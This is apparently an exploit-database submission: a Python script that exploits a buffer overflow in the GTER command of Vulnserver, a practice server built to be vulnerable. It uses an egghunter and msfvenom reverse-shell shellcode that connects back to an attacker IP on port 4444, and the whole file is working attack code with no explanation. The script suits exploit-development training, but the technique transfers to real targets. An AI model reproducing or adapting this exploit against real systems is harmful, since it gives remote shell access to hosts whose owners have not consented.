# Exploit Title: Vuln Server  - Remote Buffer Overflow GTER command
# Date: 1-5-2019
# Exploit Author: buffered4ever
# Vendor Homepage: http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
# Software Link: http://sites.google.com/site/lupingreycorner/vulnserver.zip
# Version: NA
# Tested on: Windows XP SP2

#!/usr/bin/python

import socket
import os
import sys

host="192.168.0.102"
port=9999

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.104 LPORT=4444 -b '\x00\x0a\x0d' -f python
buf =  ""
buf += "\xbd\x8d\x81\xc8\x38\xdb\xc0\xd9\x74\x24\xf4\x58\x2b"
buf += "\xc9\xb1\x52\x31\x68\x12\x03\x68\x12\x83\x65\x7d\x2a"
buf += "\xcd\x89\x96\x29\x2e\x71\x67\x4e\xa6\x94\x56\x4e\xdc"
buf += "\xdd\xc9\x7e\x96\xb3\xe5\xf5\xfa\x27\x7d\x7b\xd3\x48"
buf += "\x36\x36\x05\x67\xc7\x6b\x75\xe6\x4b\x76\xaa\xc8\x72"
buf += "\xb9\xbf\x09\xb2\xa4\x32\x5b\x6b\xa2\xe1\x4b\x18\xfe"
buf += "\x39\xe0\x52\xee\x39\x15\x22\x11\x6b\x88\x38\x48\xab"
buf += "\x2b\xec\xe0\xe2\x33\xf1\xcd\xbd\xc8\xc1\xba\x3f\x18"
buf += "\x18\x42\x93\x65\x94\xb1\xed\xa2\x13\x2a\x98\xda\x67"
buf += "\xd7\x9b\x19\x15\x03\x29\xb9\xbd\xc0\x89\x65\x3f\x04"
buf += "\x4f\xee\x33\xe1\x1b\xa8\x57\xf4\xc8\xc3\x6c\x7d\xef"
buf += "\x03\xe5\xc5\xd4\x87\xad\x9e\x75\x9e\x0b\x70\x89\xc0"
buf += "\xf3\x2d\x2f\x8b\x1e\x39\x42\xd6\x76\x8e\x6f\xe8\x86"
buf += "\x98\xf8\x9b\xb4\x07\x53\x33\xf5\xc0\x7d\xc4\xfa\xfa"
buf += "\x3a\x5a\x05\x05\x3b\x73\xc2\x51\x6b\xeb\xe3\xd9\xe0"
buf += "\xeb\x0c\x0c\xa6\xbb\xa2\xff\x07\x6b\x03\x50\xe0\x61"
buf += "\x8c\x8f\x10\x8a\x46\xb8\xbb\x71\x01\x07\x93\x79\xb9"
buf += "\xef\xe6\x79\x28\xac\x6f\x9f\x20\x5c\x26\x08\xdd\xc5"
buf += "\x63\xc2\x7c\x09\xbe\xaf\xbf\x81\x4d\x50\x71\x62\x3b"
buf += "\x42\xe6\x82\x76\x38\xa1\x9d\xac\x54\x2d\x0f\x2b\xa4"
buf += "\x38\x2c\xe4\xf3\x6d\x82\xfd\x91\x83\xbd\x57\x87\x59"
buf += "\x5b\x9f\x03\x86\x98\x1e\x8a\x4b\xa4\x04\x9c\x95\x25"
buf += "\x01\xc8\x49\x70\xdf\xa6\x2f\x2a\x91\x10\xe6\x81\x7b"
buf += "\xf4\x7f\xea\xbb\x82\x7f\x27\x4a\x6a\x31\x9e\x0b\x95"
buf += "\xfe\x76\x9c\xee\xe2\xe6\x63\x25\xa7\x17\x2e\x67\x8e"
buf += "\xbf\xf7\xf2\x92\xdd\x07\x29\xd0\xdb\x8b\xdb\xa9\x1f"
buf += "\x93\xae\xac\x64\x13\x43\xdd\xf5\xf6\x63\x72\xf5\xd2"

#0x62501203 JMP ESP

buffer = "GTER /.:/" + egghunter +"A" * (147-len(egghunter)) + "\x03\x12\x50\x62"  + "\xe9" + "\x64\xff\xff\xff" +"C" * (3000-159)
buffer2 = "TRUN /.:/" + "T00WT00W"+ buf
expl1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl1.connect((host, port))
expl1.recv(1024)
expl1.send(buffer2)
expl1.recv(1024)
expl1.close()
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.recv(1024)
expl.send(buffer)
expl.recv(1024)
expl.close()
